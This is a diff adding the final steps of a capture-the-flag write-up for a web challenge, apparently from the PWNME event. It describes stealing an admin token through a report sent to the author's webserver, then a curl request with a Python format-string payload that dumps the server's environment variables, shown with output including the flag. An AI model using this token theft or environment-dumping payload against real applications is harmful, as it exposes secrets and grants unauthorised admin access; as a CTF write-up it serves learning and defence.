@@ -214,5 +214,28 @@ We can then add `.environ` to get the environment variables:
 
 We get the sample flag!
 
-Let's execute this on remote.
+Let's do the steps on remote:
+1. Trigger the report to our webserver to steal the `X_Admin_Token`
 
+We get the token `X-Admin-Token=17c738b0787c99a392debb90bf9b57be`
+
+- Use that token to get the flag from the Python format string vulnerability
+
+```bash
+$ curl -X GET "https://saymyname-c588791ba9cff43a.deploy.phreaks.fr/admin?prompt=%7B0.__globals__%5BFlask%5D.__init__.__globals__%5Bos%5D.environ%7D" --cookie "X-Admin-Token=17c738b0787c99a392debb90bf9b57be"
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin</title>
+</head>
+<body>
+    environ({&#39;PATH&#39;: &#39;/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#39;, &#39;HOSTNAME&#39;: &#39;ctf-saymyname-c588791ba9cff43a-785bb6f958-qds96&#39;, &#39;LANG&#39;: &#39;C.UTF-8&#39;, &#39;GPG_KEY&#39;: &#39;E3FF2839C048B25C084DEBE9B26995E310250568&#39;, &#39;PYTHON_VERSION&#39;: &#39;3.9.4&#39;, &#39;PYTHON_PIP_VERSION&#39;: &#39;21.1.1&#39;, &#39;PYTHON_GET_PIP_URL&#39;: &#39;https://github.com/pypa/get-pip/raw/1954f15b3f102ace496a34a013ea76b061535bd2/public/get-pip.py&#39;, &#39;PYTHON_GET_PIP_SHA256&#39;: &#39;f499d76e0149a673fb8246d88e116db589afbd291739bd84f2cd9a7bca7b6993&#39;, &#39;DEBIAN_FRONTEND&#39;: &#39;noninteractive&#39;, &#39;FLAG&#39;: &#39;PWNME{b492b312612c741b3b6597f925f88198}&#39;, &#39;KUBERNETES_SERVICE_PORT&#39;: &#39;443&#39;, &#39;KUBERNETES_SERVICE_PORT_HTTPS&#39;: &#39;443&#39;, &#39;KUBERNETES_PORT&#39;: &#39;tcp://34.118.224.1:443&#39;, &#39;KUBERNETES_PORT_443_TCP&#39;: &#39;tcp://34.118.224.1:443&#39;, &#39;KUBERNETES_PORT_443_TCP_PROTO&#39;: &#39;tcp&#39;, &#39;KUBERNETES_PORT_443_TCP_PORT&#39;: &#39;443&#39;, &#39;KUBERNETES_PORT_443_TCP_ADDR&#39;: &#39;34.118.224.1&#39;, &#39;KUBERNETES_SERVICE_HOST&#39;: &#39;34.118.224.1&#39;, &#39;HOME&#39;: &#39;/root&#39;, &#39;WERKZEUG_SERVER_FD&#39;: &#39;3&#39;})None
+</body>
+</html>
+```
+
+- Profit
+
+Flag: `PWNME{b492b312612c741b3b6597f925f88198}`
